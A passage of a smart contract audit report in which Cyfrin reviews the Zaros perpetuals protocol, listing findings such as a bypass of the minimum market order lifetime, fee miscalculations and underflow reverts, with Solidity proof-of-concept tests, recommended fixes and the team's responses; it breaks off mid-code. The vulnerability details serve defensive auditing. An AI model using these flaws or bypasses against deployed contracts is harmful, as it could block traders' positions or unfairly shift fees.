So another option is to modify the check in `PerpMarket::checkOpenInterestLimits` to be similar to the `skew` check; the transaction would be allowed if it is reducing the current open interest, even if the reduced value is still greater than the currently configured `maxOpenInterest`.

**Zaros:** Fixed in commit [8a3436c](https://github.com/zaros-labs/zaros-core/commit/8a3436ca522587b9ae631a65ae7f8343ce536e71).

**Cyfrin:** Verified.


### `MarketOrder` minimum lifetime can be easily bypassed

**Description:** `OrderBranch::createMarketOrder` validates the `marketOrderMinLifetime` of the previous pending market order before canceling it and opening a new market order:
```solidity
File: OrderBranch.sol
                // @audit `createMarketOrder` enforces minimum market order lifetime
210:         marketOrder.checkPendingOrder();
211:         marketOrder.update({ marketId: params.marketId, sizeDelta: params.sizeDelta });

File: MarketOrder.sol
55:     function checkPendingOrder(Data storage self) internal view {
56:         GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();
57:         uint128 marketOrderMinLifetime = globalConfiguration.marketOrderMinLifetime;
58:
59:         if (self.timestamp != 0 && block.timestamp - self.timestamp <= marketOrderMinLifetime) {
60:             revert Errors.MarketOrderStillPending(self.timestamp);
61:         }
62:     }
```

But in `OrderBranch::cancelMarketOrder` users can cancel the pending market order without any validation:
```solidity
File: OrderBranch.sol
219:     function cancelMarketOrder(uint128 tradingAccountId) external {
220:         MarketOrder.Data storage marketOrder = MarketOrder.loadExisting(tradingAccountId);
221:         // @audit doesn't enforce minimum market order lifetime
222:         marketOrder.clear();
223:
224:         emit LogCancelMarketOrder(msg.sender, tradingAccountId);
225:     }
```

Hence users can cancel their previous market order and open a new order anytime by calling `cancelMarketOrder` first.

**Impact:** The `marketOrderMinLifetime` requirement can be bypassed by calling `cancelMarketOrder` first.

**Recommended Mitigation:** `cancelMarketOrder` should check the `marketOrderMinLifetime` requirement.

```diff
    function cancelMarketOrder(uint128 tradingAccountId) external {
        MarketOrder.Data storage marketOrder = MarketOrder.loadExisting(tradingAccountId);

+       marketOrder.checkPendingOrder();

        marketOrder.clear();

        emit LogCancelMarketOrder(msg.sender, tradingAccountId);
    }
```

**Zaros:** Fixed in commit [41eae0e](https://github.com/zaros-labs/zaros-core/commit/41eae0ea8f04ffd877484bd7b430d7d85893f421#diff-1329f2388c20edbc7edf3e949fdb903992444d015a681e83fc62a6a02ef51b76R236).

**Cyfrin:** Verified.


### Protocol team can censor traders via centralized keepers

**Description:** The protocol team can censor traders since:
* only keepers can fulfill trader market orders
* the protocol team control which addresses can be keepers

**Impact:** The protocol team can censor traders by never filling their orders; eg they could prevent a trader from closing their opened leveraged position which severely disadvantages that trader because they remain subject to liquidation if the market moves against their position.

The protocol team could also favor some traders over others by choosing a specific order to fill pending trades which benefit some traders over others.

**Recommended Mitigation:** In terms of getting version 1 of the protocol to mainnet, it is easier and simpler to go with centralized keepers and gives the protocol team more control over the protocol. There is also likely little risk of the protocol team abusing this mechanic because it would destroy trust in the protocol. However long-term it would be ideal to move to decentralized keepers.

**Zaros:** Acknowledged.


### Protocol team can preferentially refuse to liquidate traders via centralized liquidators

**Description:** The protocol team can preferentially refuse to liquidate traders since:
* only liquidators can liquidate traders subject to liquidation
* the protocol team control which addresses can be liquidators

**Impact:** The protocol team can refuse to liquidate some traders (for example if some trading accounts are operated by the protocol and/or team members) allowing them to attempt to ride out unfavorable market movements without liquidation, giving them an advantage over other traders.

**Recommended Mitigation:** In terms of getting version 1 of the protocol to mainnet, it is easier and simpler to go with centralized liquidators and gives the protocol team more control over the protocol. There is also likely little risk of the protocol team abusing this mechanic because it would destroy trust in the protocol. However long-term it would be ideal to move to decentralized liquidators.

**Zaros:** Acknowledged.


### Traders can't limit slippage and expiration time when creating market orders

**Description:** Traders can't limit slippage and expiration time when creating market orders.

**Impact:** Traders' orders may be filled later and at a less favorable price than they were expecting.

**Recommended Mitigation:** Allow traders to specify the maximum slippage (acceptable price) they are willing to accept and the expiration time by which the order must be filled.

The price should be verified against the "Mark Price" which is stored in `ctx.fillPrice` in `SettlementBranch::_fillOrder`.

Interestingly in `leaves/MarketOrder.sol` the `Data` struct has a `timestamp` variable which is the timestamp when the trader created their order, but this is never checked when the order is filled.

**Zaros:** In commit [62c0e61](https://github.com/zaros-labs/zaros-core/commit/62c0e613ab02435dc0c3de9abdb14d7d880f2941) we have implemented a new "Off-Chain" order feature which allows users to specify a `targetPrice`. This feature is flexible enough to implement limit, stop, tp/sl and other types of trigger-based orders using some additional off-chain code.

**Cyfrin:** Verified that this new feature does provide a way for users to enforce slippage via the `targetPrice` condition. The new feature doesn't provide a deadline check but that is less important as presumably users are watching the status of the order and can cancel it off-chain. Also note that the security of this new feature has not been evaluated during this audit but will be evaluated in the competitive audit to follow.


### `SettlementBranch::_fillOrder` reverts if absolute value of PNL is smaller than sum of order and settlement fees

**Description:** `SettlementBranch::_fillOrder` calculates the position's PNL as `pnl = unrealizedPnl + accruedFunding + unary(orderFee + settlementFee)`:

```solidity
File: SettlementBranch.sol
141: ctx.pnl = oldPosition.getUnrealizedPnl(ctx.fillPrice).add(
142:     oldPosition.getAccruedFunding(ctx.fundingFeePerUnit)
143:     ).add(unary(ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18())));
144:
```

If PNL is positive and unrealized_pnl + accrued_funding < order_fee + settlement_fee this will revert due to underflow.

If the PNL is negative an amount is deduced from the account's margin:

```solidity
171: if (ctx.pnl.lt(SD_ZERO)) {
172:     UD60x18 marginToDeductUsdX18 = ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18.intoSD59x18()).gt(SD_ZERO)
         // @audit can revert with underflow if abs(pnl) < order_fee+settlement_fee
173:     ? ctx.pnl.abs().intoUD60x18().sub(ctx.orderFeeUsdX18.intoUD60x18().add(ctx.settlementFeeUsdX18))
174:     : ctx.pnl.abs().intoUD60x18();
175:
176:     tradingAccount.deductAccountMargin({
177:         feeRecipients: FeeRecipients.Data({
178:         marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
179:         orderFeeRecipient: globalConfiguration.orderFeeRecipient,
180:         settlementFeeRecipient: globalConfiguration.settlementFeeRecipient
181:     }),
182:     pnlUsdX18: marginToDeductUsdX18,
183:     orderFeeUsdX18: ctx.orderFeeUsdX18.gt(SD_ZERO) ? ctx.orderFeeUsdX18.intoUD60x18() : UD_ZERO,
184:     settlementFeeUsdX18: ctx.settlementFeeUsdX18
185:     });
```

The first condition of the `marginToDeductUsdX18` calculation at L173 will revert due to underflow if:
* the trader has a loss (negative PNL)
* the absolute value of the loss is smaller than the sum of the order/settlement fees

**Proof of Concept:** Add the following PoCs to `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`:
```solidity
function test_OrderRevertsUnderflowWhenPositivePnlLessThanFees() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 0.002e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // market moves slightly against Naruto's position
    // giving Naruto's position a slightly negative PNL
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE+1);

    // naruto attempts to close their position
    changePrank({ msgSender: users.naruto });

    // reverts due to underflow
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA/2);
}

function test_OrderRevertsUnderflowWhenNegativePnlLessThanFees() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 0.002e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // market moves slightly against Naruto's position
    // giving Naruto's position a slightly negative PNL
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE-1);

    // naruto attempts to partially close their position
    changePrank({ msgSender: users.naruto });

    // reverts due to underflow
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA/2);
}
```

Run with:
* `forge test --match-test test_OrderRevertsUnderflowWhenPositivePnlLessThanFees -vvv`
* `forge test --match-test test_OrderRevertsUnderflowWhenNegativePnlLessThanFees -vvv`

**Recommended Mitigation:** Refactor how old position PNL is settled and  order/settlement fees are paid.

**Zaros:** Fixed in commit [516bc2a](https://github.com/zaros-labs/zaros-core/commit/516bc2ad61d64e94654db500a93bd19567ca01e5).

**Cyfrin:** Verified.


### `PerpMarket::getOrderFeeUsd` incorrectly charges `makerFee` when skew is zero and trade is buy order

**Description:** In `PerpMarket::getOrderFeeUsd` there is this comment to which I've added (*) at the end:
```solidity
/// @dev When the skew is zero, taker fee will be charged. (*)
```

But doing a truth table for the `if` statement's boolean expression shows this comment is not always true:
```solidity
// isSkewGtZero = true,  isBuyOrder = true  -> taker fee
// isSkewGtZero = true,  isBuyOrder = false -> maker fee
// isSkewGtZero = false, isBuyOrder = true  -> maker fee (*)
// isSkewGtZero = false, isBuyOrder = false -> taker fee
if (isSkewGtZero != isBuyOrder) {
    // not equal charge maker fee
    feeBps = sd59x18((self.configuration.orderFees.makerFee));
} else {
    // equal charge taker fee
    feeBps = sd59x18((self.configuration.orderFees.takerFee));
}
```

When `isSkewGtZero == false && isBuyOrder = true`, the *maker* fee will be charged, even though the skew is zero and hence this order is causing the skew. This behavior is the opposite of what the comment says should happen, and logically the *taker* fee should be charged if the trade causes the skew.

**Impact:** Incorrect fee is charged.

**Recommended Mitigation:** When `isSkewGtZero == false && isBuyOrder = true` the *taker* fee should be charged since the trader is causing the skew.

**Zaros:** Fixed in commits [534b089](https://github.com/zaros-labs/zaros-core/commit/534b0891d836e1cd01daf808f72c39269aa213ae) and [5822b19](https://github.com/zaros-labs/zaros-core/commit/5822b19b987b23fb3373afc0fb3e7a30441cdd01).

**Cyfrin:** Verified.


### `PerpMarket::getOrderFeeUsd` rewards traders who flip the skew with `makerFee` for the full trade

**Description:** `PerpMarket::getOrderFeeUsd` rewards traders who flip the skew with `makerFee` for the full trade. This is not ideal as since the trader has flipped the skew, their trade has partly created the opposite skew so their trade has been partly a `taker` not just a `maker`.

**Impact:** Traders pay slightly less fees than they should when flipping the skew by getting the full `makerFee` instead of only partially.

**Recommended Mitigation:** When a trade flips the skew, the trader should only pay `makerFee` on the part of the trade which moved the skew to zero. Then the trader should pay `takerFee` for the remaining part of the trade which flipped the skew.

**Zaros:** Fixed in commit [5822b19](https://github.com/zaros-labs/zaros-core/commit/5822b19b987b23fb3373afc0fb3e7a30441cdd01).

**Cyfrin:** Verified.


### `OrderBranch::getMarginRequirementForTrade` doesn't include order and settlement fees when calculating margin requirements

**Description:** `OrderBranch::getMarginRequirementForTrade` doesn't include order and settlement fees when calculating margin requirements but this occurs in other places such as [`OrderBranch::createMarketOrder`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/OrderBranch.sol#L197-L208).

**Impact:** `OrderBranch::getMarginRequirementForTrade` will return lower collateral requirements than actually required. This function doesn't appear to be used anywhere by the smart contracts so possibly only affects the user interface.

**Recommended Mitigation:** `OrderBranch::getMarginRequirementForTrade` should factor in the order and settlement fees when calculating margin requirements; it could copy `OrderBranch::simulateTrade` which does this:
```solidity
orderFeeUsdX18 = perpMarket.getOrderFeeUsd(sd59x18(sizeDelta), fillPriceX18);
settlementFeeUsdX18 = ud60x18(uint256(settlementConfiguration.fee));
```

**Zaros:** Fixed in commit [5542a04](https://github.com/zaros-labs/zaros-core/commit/5542a04c976d705ad0fcc86eff58a4ad815d4535).

**Cyfrin:** Verified.

\clearpage
## Informational


### Unused variables

**Description:** Some errors and constants aren't used in the codebase.

```solidity
File: Errors.sol
11:     error InvalidParameter(string parameter, string reason);
38:     error OnlyForwarder(address sender, address forwarder);
79:     error InvalidLiquidationReward(uint128 liquidationFeeUsdX18);

File: Constants.sol
10:     uint32 internal constant MAX_MIN_DELEGATE_TIME = 30 days;
```

**Zaros:** Fixed in commit [37071ed](https://github.com/zaros-labs/zaros-core/commit/37071ed2c6845121e2eda4143ad233d20a1d7e6f).

**Cyfrin:** Verified.


### Return more suitable error type when `params.initialMarginRateX18 <= params.maintenanceMarginRateX18`

**Description:** In `GlobalConfigurationBranch::createPerpMarket`, the following two error cases both return the `ZeroInput` error type:
```solidity
if (params.initialMarginRateX18 <= params.maintenanceMarginRateX18) {
    revert Errors.ZeroInput("initialMarginRateX18");
}
if (params.initialMarginRateX18 == 0) {
    revert Errors.ZeroInput("initialMarginRateX18");
}
```

In the first case where `initialMarginRateX18 < maintenanceMarginRateX18` the error is misleading; a more suitable error type such as `InvalidParameter` should be returned.

The same occurs in `GlobalConfigurationBranch::updatePerpMarketConfiguration` but there the second check `initialMarginRateX18 == 0` is omitted; consider whether to add this check in.

The second validation may be redundant because the first validation will always revert first; if a specific error is desired for the zero case then perform it first, otherwise consider removing it.

**Zaros:** Fixed in commit [c35e2be](https://github.com/zaros-labs/zaros-core/commit/c35e2bea50a0753726ac79503e607e9dcf637b6b).

**Cyfrin:** Verified.


### Standardize `accountId` data type

**Description:** The `accountId` uses different data types in different contracts:
* `uint96` in [`GlobalConfiguration::Data`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/GlobalConfiguration.sol#L44)
* `uint128` in [`TradingAccount::Data`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/TradingAccount.sol#L45) and [`TradingAccountBranch::createTradingAccount`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/TradingAccountBranch.sol#L219)
* `uint256` in [`AccountNFT`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/account-nft/AccountNFT.sol#L18-L22).

**Recommended Mitigation:** Standardize on one data type everywhere.

**Zaros:** We'll use uint128 data type as default, but:
* `uint96` in `GlobalConfiguration::Data` in order to pack the storage values
* `uint256` in AccountNFT to override `ERC721::_update`



### The `LogConfigureMarginCollateral` event doesn't emit `loanToValue`

**Description:** The [LogConfigureMarginCollateral](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/GlobalConfigurationBranch.sol#L212) event omits `loanToValue` during a margin collateral configuration.

**Recommended Mitigation:** Recommend emitting `loanToValue` also.

**Zaros:** Fixed in commit [aef72cd](https://github.com/zaros-labs/zaros-core/commit/aef72cdc4319314c2a4b9497ba39a5621657f7b4).

**Cyfrin:** Verified.


### Inconsistent validation while creating/updating a perp market

**Description:** `GlobalConfigurationBranch::createPerpMarket` [reverts](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/GlobalConfigurationBranch.sol#L351-L353) if `maxFundingVelocity` is zero but the same check doesn't occur in `GlobalConfigurationBranch::updatePerpMarketConfiguration`.

**Recommended Mitigation:** Consider applying the same validations when creating and updating a perp market.

**Zaros:** Fixed in commit [ad2bcb1](https://github.com/zaros-labs/zaros-core/commit/ad2bcb114a9aaa0ed8838e05335d78badb51032b).

**Cyfrin:** Verified.


### `GlobalConfigurationBranch::updateSettlementConfiguration` can be called for a non-existent `marketId`

**Description:** `GlobalConfigurationBranch::updateSettlementConfiguration` doesn't validate if the `marketId` exists:

```solidity
function updateSettlementConfiguration(
    uint128 marketId,
    uint128 settlementConfigurationId,
    SettlementConfiguration.Data memory newSettlementConfiguration
)
    external
    onlyOwner
{
    SettlementConfiguration.update(marketId, settlementConfigurationId, newSettlementConfiguration);

    emit LogUpdateSettlementConfiguration(msg.sender, marketId, settlementConfigurationId);
}
```

But other functions like `updatePerpMarketStatus` do validate that the `marketId` exists:

```solidity
function updatePerpMarketStatus(uint128 marketId, bool enable) external onlyOwner {
    GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();
    PerpMarket.Data storage perpMarket = PerpMarket.load(marketId);

    if (!perpMarket.initialized) {
        revert Errors.PerpMarketNotInitialized(marketId);
    }
```

**Recommended Mitigation:** Verify `marketId` validity in `updateSettlementConfiguration`.

**Zaros:** Fixed in commit [75be42e](https://github.com/zaros-labs/zaros-core/commit/75be42e892c13cb26876d66b0c5184971700714e).

**Cyfrin:** Verified.


### Liquidation reverts if collateral price feed returns 0

**Description:** Liquidation reverts if collateral price feed returns 0. Generally this should never happen as Chainlink price feeds have a `minAnswer` they should always at least return. However since a trader can have a basket of different collateral, it may be worth handling this edge case and trying to liquidate other collateral.

**Proof of Concept:** Add the following PoC to `test/integration/perpetuals/liquidation-branch/liquidateAccounts/liquidateAccounts.t.sol`:
```solidity
function test_LiquidationRevertsWhenPriceFeedReturnsZero() external {
    // give naruto some wstEth to deposit as collateral
    uint256 USER_STARTING_BALANCE = 1e18;
    int128  USER_POS_SIZE_DELTA   = 1e18;
    deal({ token: address(mockWstEth), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(mockWstEth));

    // naruto opens first position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // price of naruto's collateral has a LUNA-like crash
    // this code occur while the L2 stopped producing blocks
    // as recently happened during the Linea hack such that
    // the liquidation bots could not perform a timely
    // liquidation of the position
    MockPriceFeed wstEthPriceFeed = mockPriceAdapters.mockWstEthUsdPriceAdapter;
    wstEthPriceFeed.updateMockPrice(0);

    // verify naruto can now be liquidated
    uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(tradingAccountId, liquidatableAccountsIds[0]);

    // attempt to liquidate naruto
    changePrank({ msgSender: liquidationKeeper });
    // reverts with `panic: division or modulo by zero`
    perpsEngine.liquidateAccounts(liquidatableAccountsIds, users.settlementFeeRecipient);
}
```

Run with: `forge test --match-test test_LiquidationRevertsWhenPriceFeedReturnsZero -vvv`

**Zaros:** Acknowledged; very unlikely to occur since Chainlink price feeds have in-built minimum prices they will return which are typically > 0.

\clearpage
## Gas Optimization


### Use named return variables to save 9 gas per return variable

**Description:** Use named return variables to [save 9 gas per return variable](https://x.com/DevDacian/status/1796396988659093968) and also simplify function code:

```solidity
File: src/external/ChainlinkUtil.sol
84:        returns (FeeAsset memory)

File: src/perpetuals/branches/OrderBranch.sol
128:        returns (UD60x18, UD60x18) // @audit in getMarginRequirementForTrade()
144:    function getActiveMarketOrder(uint128 tradingAccountId) external pure returns (MarketOrder.Data memory) {

File: src/perpetuals/leaves/PerpMarket.sol
97:        returns (UD60x18) // @audit in getMarkPrice()

File: src/tree-proxy/RootProxy.sol
50:    function _implementation() internal view override returns (address) {

// @audit refactor to:
function _implementation() internal view override returns (address branch) {
    RootUpgrade.Data storage rootUpgrade = RootUpgrade.load();

    branch = rootUpgrade.getBranchAddress(msg.sig);
    if (branch == address(0)) revert Errors.UnsupportedFunction(msg.sig);
}
```

**Zaros:** Fixed in commit [4972f52](https://github.com/zaros-labs/zaros-core/commit/4972f52e04ebbcbe0d56ad2136d8023bb5fc0d9f).

**Cyfrin:** Verified.


### Don't initialize variables to default values

**Description:** Don't initialize variables to default values as this is already done:

```solidity
File: src/tree-proxy/leaves/RootUpgrade.sol
70:        for (uint256 i = 0; i < selectorCount; i++) {
81:        for (uint256 i = 0; i < branchCount; i++) {
97:        for (uint256 i = 0; i < branchUpgrades.length; i++) {
117:        for (uint256 i = 0; i < selectors.length; i++) {
136:        for (uint256 i = 0; i < selectors.length; i++) {
171:        for (uint256 i = 0; i < selectors.length; i++) {
202:        for (uint256 i = 0; i < initializables.length; i++) {

File: src/perpetuals/leaves/GlobalConfiguration.sol
96:        for (uint256 i = 0; i < collateralTypes.length; i++) {

File: src/perpetuals/branches/GlobalConfigurationBranch.sol
185:        for (uint256 i = 0; i < liquidators.length; i++) {

File: src/perpetuals/leaves/PerpMarket.sol
345:            for (uint256 i = 0; i < params.customOrdersConfiguration.length; i++) {

File: src/perpetuals/leaves/TradingAccount.sol
145:        for (uint256 i = 0; i < self.marginCollateralBalanceX18.length(); i++) {
169:        for (uint256 i = 0; i < self.marginCollateralBalanceX18.length(); i++) {
229:        for (uint256 i = 0; i < self.activeMarketsIds.length(); i++) {
264:        for (uint256 i = 0; i < self.activeMarketsIds.length(); i++) {
420:        for (uint256 i = 0; i < globalConfiguration.collateralLiquidationPriority.length(); i++) {

File: src/perpetuals/branches/TradingAccountBranch.sol
122:        for (uint256 i = 0; i < tradingAccount.activeMarketsIds.length(); i++) {
168:        for (uint256 i = 0; i < tradingAccount.activeMarketsIds.length(); i++) {
241:        for (uint256 i = 0; i < data.length; i++) {

File: src/perpetuals/branches/LiquidationBranch.sol
103:        for (uint256 i = 0; i < accountsIds.length; i++) {
135:            for (uint256 j = 0; j < ctx.amountOfOpenPositions; j++) {
```

**Zaros:** Fixed in commit [1a7df5c](https://github.com/zaros-labs/zaros-core/commit/1a7df5c565233aa9a3a3b47bceb614e6a7d57cc4).

**Cyfrin:** Verified.


### Cache memory array length if expected size of array is >= 3

**Description:** Cache memory array length if [expected size of array is >= 3](https://x.com/DevDacian/status/1791490921881903468):

```solidity
File: src/tree-proxy/leaves/RootUpgrade.sol
97:        for (uint256 i = 0; i < branchUpgrades.length; i++) {
117:        for (uint256 i = 0; i < selectors.length; i++) {
136:        for (uint256 i = 0; i < selectors.length; i++) {
171:        for (uint256 i = 0; i < selectors.length; i++) {
202:        for (uint256 i = 0; i < initializables.length; i++) {

File: src/perpetuals/leaves/GlobalConfiguration.sol
96:        for (uint256 i = 0; i < collateralTypes.length; i++) {

File: src/perpetuals/leaves/PerpMarket.sol
// @audit the `if` statement can be removed as it is obsolete;
// the `for` loop will never execute if `length == 0`
344:        if (params.customOrdersConfiguration.length > 0) {
345:            for (uint256 i = 0; i < params.customOrdersConfiguration.length; i++) {

File: src/perpetuals/leaves/TradingAccount.sol
145:        for (uint256 i = 0; i < self.marginCollateralBalanceX18.length(); i++) {
169:        for (uint256 i = 0; i < self.marginCollateralBalanceX18.length(); i++) {
229:        for (uint256 i = 0; i < self.activeMarketsIds.length(); i++) {
264:        for (uint256 i = 0; i < self.activeMarketsIds.length(); i++) {
420:        for (uint256 i = 0; i < globalConfiguration.collateralLiquidationPriority.length(); i++) {

File: src/perpetuals/branches/TradingAccountBranch.sol
122:        for (uint256 i = 0; i < tradingAccount.activeMarketsIds.length(); i++) {
168:        for (uint256 i = 0; i < tradingAccount.activeMarketsIds.length(); i++) {

File: src/perpetuals/branches/LiquidationBranch.sol
57:            if (i >= globalConfiguration.accountsIdsWithActivePositions.length()) break;
```

**Zaros:** Fixed in commit [3c5d345](https://github.com/zaros-labs/zaros-core/commit/3c5d3456eefa7cde1c834895a1eb600387d2f37a).

**Cyfrin:** Verified.


### Move immutable branch check outside `for` loop in `RootUpgrade::removeBranch`

**Description:** Move immutable branch check outside `for` loop in `RootUpgrade::removeBranch` - this check should only occur once not during every loop iteration.

**Recommended Mitigation:**
```solidity
function removeBranch(Data storage self, address branch, bytes4[] memory selectors) internal {
    if (branch == address(this)) {
        revert Errors.ImmutableBranch();
    }

    for (uint256 i = 0; i < selectors.length; i++) {
        bytes4 selector = selectors[i];
        // also reverts if left side returns zero address
        if (selector == bytes4(0)) {
            revert Errors.SelectorIsZero();
        }
        if (self.selectorToBranch[selector] != branch) {
            revert Errors.CannotRemoveFromOtherBranch(branch, selector);
        }

        delete self.selectorToBranch[selector];
        // slither-disable-next-line unused-return
        self.branchSelectors[branch].remove(selector);
        // if no more selectors in branch, remove branch address
        if (self.branchSelectors[branch].length() == 0) {
            // slither-disable-next-line unused-return
            self.branches.remove(branch);
        }
    }
}
```

**Zaros:** Fixed in commit [6313b3f](https://github.com/zaros-labs/zaros-core/commit/6313b3f2b485e244679b23f937e66b0144e59f31).

**Cyfrin:** Verified.


### Optimize away call to `EnumerableSet::contains` in `GlobalConfiguration::configureCollateralLiquidationPriority`

**Description:** Optimize away call to `EnumerableSet::contains` in `GlobalConfiguration::configureCollateralLiquidationPriority` by using the `bool` result from `EnumerableSet::add`.

**Recommended Mitigation:**
```solidity
function configureCollateralLiquidationPriority(Data storage self, address[] memory collateralTypes) internal {
    for (uint256 i = 0; i < collateralTypes.length; i++) {
        if (collateralTypes[i] == address(0)) {
            revert Errors.ZeroInput("collateralType");
        }

        if(!self.collateralLiquidationPriority.add(collateralTypes[i])) {
            revert Errors.MarginCollateralAlreadyInPriority(collateralTypes[i]);
        }
    }
}
```

**Zaros:** Fixed in commit [5b8e51e](https://github.com/zaros-labs/zaros-core/commit/5b8e51e39d8f052480af31b490404e29ad34335f#diff-3d4f0f7ecf19ca9cf461570d8c3f5ac0ba6b60345386d9ebf0d820e7c997738dL103-L107).

**Cyfrin:** Verified.


### Remove redundant `uint256` cast in `PerpMarket::getMarkPrice`

**Description:** Remove redundant `uint256` cast in `PerpMarket::getMarkPrice` since `self.configuration.skewScale` is [already](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/MarketConfiguration.sol#L30) `uint256`.

**Recommended Mitigation:**
```solidity
SD59x18 skewScale = sd59x18(self.configuration.skewScale.toInt256());
```

**Zaros:** Fixed in commit [560f291](https://github.com/zaros-labs/zaros-core/commit/560f2910e88ca7a8761b4e16e8717a2e75a94256).

**Cyfrin:** Verified.


### Cache result of `indexPriceX18.intoSD59x18` in `PerpMarket::getMarkPrice`

**Description:** Cache result of `indexPriceX18.intoSD59x18` in `PerpMarket::getMarkPrice` instead of re-calculating the same value 4 times.

**Impact:** This stand-alone test shows caching saves 227 gas per execution:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {UD60x18} from "@prb/math/src/UD60x18.sol";
import {SD59x18} from "@prb/math/src/SD59x18.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {Test, console} from "forge-std/Test.sol";

interface IMath {
    function calc(UD60x18 indexPriceX18,
                  SD59x18 priceImpactBeforeDelta,
                  SD59x18 priceImpactAfterDelta) external pure
             returns (UD60x18 priceBeforeDelta, UD60x18 priceAfterDelta) ;
}

// each function gets its own contract to avoid gas cost due to
// function selector preferring one over another
contract CacheMath is IMath {
    function calc(UD60x18 indexPriceX18,
                  SD59x18 priceImpactBeforeDelta,
                  SD59x18 priceImpactAfterDelta) external pure
             returns (UD60x18 priceBeforeDelta, UD60x18 priceAfterDelta)  {

        SD59x18 cachedVal = indexPriceX18.intoSD59x18();

        priceBeforeDelta = cachedVal.add(cachedVal.mul(priceImpactBeforeDelta)).intoUD60x18();
        priceAfterDelta  = cachedVal.add(cachedVal.mul(priceImpactAfterDelta)).intoUD60x18();
    }
}

contract NoCacheMath is IMath {
    function calc(UD60x18 indexPriceX18,
                  SD59x18 priceImpactBeforeDelta,
                  SD59x18 priceImpactAfterDelta) external pure
             returns (UD60x18 priceBeforeDelta, UD60x18 priceAfterDelta)  {

        priceBeforeDelta =
            indexPriceX18.intoSD59x18().add(indexPriceX18.intoSD59x18().mul(priceImpactBeforeDelta)).intoUD60x18();
        priceAfterDelta =
            indexPriceX18.intoSD59x18().add(indexPriceX18.intoSD59x18().mul(priceImpactAfterDelta)).intoUD60x18();
    }
}

// run from base directory with:
// forge test --match-contract CacheMathGasTest -vvv
contract CacheMathGasTest is Test {
    GasMeter gasMeter    = new GasMeter();
    IMath    cacheMath   = new CacheMath();
    IMath    noCacheMath = new NoCacheMath();

    uint256 a = 12345667345345564334;
    int256 b  = 3645645897645689746;
    int256 c  = 546546458764565646;

    function test_CacheMathVsNoCacheMath() external {
        UD60x18 a1 = UD60x18.wrap(a);
        SD59x18 b1 = SD59x18.wrap(b);
        SD59x18 c1 = SD59x18.wrap(c);

        // call every function to have gas calculated
        (uint256 cacheMathGas,) = gasMeter.meterCall(
            address(cacheMath),
            abi.encodeWithSelector(IMath.calc.selector, a1, b1, c1)
        );

        (uint256 noCacheMathGas,) = gasMeter.meterCall(
            address(noCacheMath),
            abi.encodeWithSelector(IMath.calc.selector, a1, b1, c1)
        );

        string memory outputStr = string.concat(Strings.toString(cacheMathGas), " ",
                                                Strings.toString(noCacheMathGas));

        // easy spreadsheet input
        console.log(outputStr);
        // cached     = 1886
        // not cached = 2113
        // result: cached version saves 227 gas
    }
}

// taken from https://github.com/orenyomtov/gas-meter/blob/main/test/GasMeter.t.sol
contract GasMeter {
    // output of: huffc --evm-version paris -r src/GasMeter.huff
    bytes internal constant _HUFF_GAS_METER_COMPILED_BYTECODE = (
